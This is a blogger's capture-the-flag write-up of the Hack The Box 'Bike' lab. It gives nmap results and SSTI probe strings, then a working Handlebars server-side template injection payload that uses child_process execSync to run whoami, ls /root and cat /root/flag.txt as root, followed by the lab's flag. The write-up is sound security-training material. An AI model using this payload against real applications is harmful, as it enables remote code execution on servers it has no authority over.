---
title: "[HTB] Bike"
author: "Wook Lee"
date: "2024-07-17"
tags: ["Hack The Box"]
---

This box was really tough to pwn. I am 100% sure I wouldn't have been able to clear it on my own without the provided walkthrough documents. I understand every step from the enumeration phase to the exploit, but I think I lack the knowledge to connect the dots between enumeration and exploits. This is also my first time encountering the `Template Engine` and `SSTI Vulnerability`. I know it takes time, and I have improved a lot over the past month. I am trying not to hurry my learning because impatience has negatively impacted me several times in my life. I really do not want that to happen again. Let's take it slow.

---

#### What TCP ports does nmap identify as open? Answer with a list of ports separated by commas with no spaces, from low to high.

```
22,80
```

![alt text](image.png#center)

<br>

#### What software is running the service listening on the http/web port identified in the first question?

```
Node.js
```

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Node.js (Express middleware)
|_http-title:  Bike
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<br>

#### What is the name of the Web Framework according to Wappalyzer?

```
Express
```

![alt text](image-1.png#center)

<br>

#### What is the name of the vulnerability we test for by submitting {{7*7}}?

```
Server Side Template Injection
```

According to the official write up, `Server-side template injection` is a vulnerability where the attacker injects malicious input into a template in order to execute commands on the server. This attack is very common on Node.js websites and there is a good possibility that a Template Engine is being used to reflect the email that the user inputs in the contact field.

the following variety of special characters are commonly used in template expressions. Some of these payloads are used to identify SSTI vulnerabilities. If an SSTI exists, after submitting one of them, the web server will detect these expressions as valid code and attempt to execute them, in this instance calculating the mathematical equation `7 * 7`, which is equal to 49.

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

<br>

Inputted `{{7 * 7}}` into the email form and it outputted the following:
![alt text](image-2.png#center)

This output means that the payload was indeed detected as valid by the template engine, but the code had some error and was unable to be executed. An error is not always a bad thing. From this output, we can see that the server is running from the `/root/Backend` directory and also that the `Handlebars` Template is being used.

<br>

#### What is the templating engine being used within Node.js?

```
Handlebars
```

<br>

#### What is the name of the BurpSuite tab used to encode text?

```
Decoder
```

<br>

#### In order to send special characters in our payload in an HTTP request, we will encode the payload. What type of encoding do we use?

```
URL
```

When making a request to a web server, the data that we send can only contain certain characters from the standard 128 character ASCII set. Reserved characters that do not belong to this set must be encoded. For this reason we use an encoding procedure that is called `URL Encoding`.

With this process, the reserved character `&` becomes `%26`. Burpsuite has a tab called `Decoder` that allows us to either decode or encode the text of our choice with various different encoding methods, including URL.

<br>

Let's copy the payload of Handlebars (NodeJS) from the HackTricks and paste into the Burpsuite Decoder.
![alt text](image-3.png#center)

![alt text](image-4.png#center)

<br>

#### When we use a payload from HackTricks to try to run system commands, we get an error back. What is "not defined" in the response error?

```
require
```

I copied the URL encoded payload and pasted it in the email field via the request tab of Repeater. I sent the request and the response output showed that `require is not defined`. That's because our payload includes `require`, which is a Javascript keyword.

According to the Walkthrough, Template Engines are often Sanboxed, meaning their code runs in a restricted code space so that in the event of malicious code being run, it will be very hard to load modules that can run system commands. If we cannot directly use `require` to load such modules, we will have to find a different way.

![alt text](image-5.png#center)

<br>

#### What variable is the name of the top-level scope in Node.JS?

```
Global
```

In computer programming `Globals` are variables that are globally accessible throughout the program. `require` keyword is in fact not in the global scope.

I modified my payload code like the following, I got the `status 200` response and the `require` object has been called successfully and the `child_process` module loaded.

```js
{{#with "s" as |string|}}
 {{#with "e"}}
 {{#with split as |conslist|}}
 {{this.pop}}
 {{this.push (lookup string.sub "constructor")}}
 {{this.pop}}
 {{#with string.split as |codelist|}}
 {{this.pop}}
 {{this.push "return process.mainModule.require('child_process');"}}
 {{this.pop}}
 {{#each conslist}}
 {{#with (string.sub.apply 0 codelist)}}
 {{this}}
 {{/with}}
 {{/each}}
 {{/with}}
 {{/with}}
 {{/with}}
{{/with}}
```

<br>

![alt text](image-6.png#center)

<br>

#### By exploiting this vulnerability, we get command execution as the user the webserver is running as. What is the name of that user?

```
root
```

I attempted to run system commands now by running the following payload (of course I needed to URLencode it first through Burpsuite Decoder)

```js
{{#with "s" as |string|}}
 {{#with "e"}}
 {{#with split as |conslist|}}
 {{this.pop}}
 {{this.push (lookup string.sub "constructor")}}
 {{this.pop}}
 {{#with string.split as |codelist|}}
 {{this.pop}}
 {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
 {{this.pop}}
 {{#each conslist}}
 {{#with (string.sub.apply 0 codelist)}}
 {{this}}
 {{/with}}
 {{/each}}
 {{/with}}
 {{/with}}
 {{/with}}
{{/with}}
```

The system command successfully returned `root`, meaning that I have run the system commands on the box and also that the web server is running in the context of the `root` user.

<br>

#### Submit root flag

```
6b258d726d287462d60c103d0142a81c
```

```js
{{#with "s" as |string|}}
 {{#with "e"}}
 {{#with split as |conslist|}}
 {{this.pop}}
 {{this.push (lookup string.sub "constructor")}}
 {{this.pop}}
 {{#with string.split as |codelist|}}
 {{this.pop}}
 {{this.push "return process.mainModule.require('child_process').execSync('ls /root');"}}
 {{this.pop}}
 {{#each conslist}}
 {{#with (string.sub.apply 0 codelist)}}
 {{this}}
 {{/with}}
 {{/each}}
 {{/with}}
 {{/with}}
 {{/with}}
{{/with}}
```

With the payload above which contains the command `ls /root`, I was able to confirm that the `root` directory contains the flag.txt file. All I need to do is modify the payload further for the one last time to display the flag.

![alt text](image-7.png#center)

<br>

```js
{{#with "s" as |string|}}
 {{#with "e"}}
 {{#with split as |conslist|}}
 {{this.pop}}
 {{this.push (lookup string.sub "constructor")}}
 {{this.pop}}
 {{#with string.split as |codelist|}}
 {{this.pop}}
 {{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}
 {{this.pop}}
 {{#each conslist}}
 {{#with (string.sub.apply 0 codelist)}}
 {{this}}
 {{/with}}
 {{/each}}
 {{/with}}
 {{/with}}
 {{/with}}
{{/with}}
```

Got the flag.

![alt text](image-8.png#center)

<br>

![alt text](image-9.png#center)
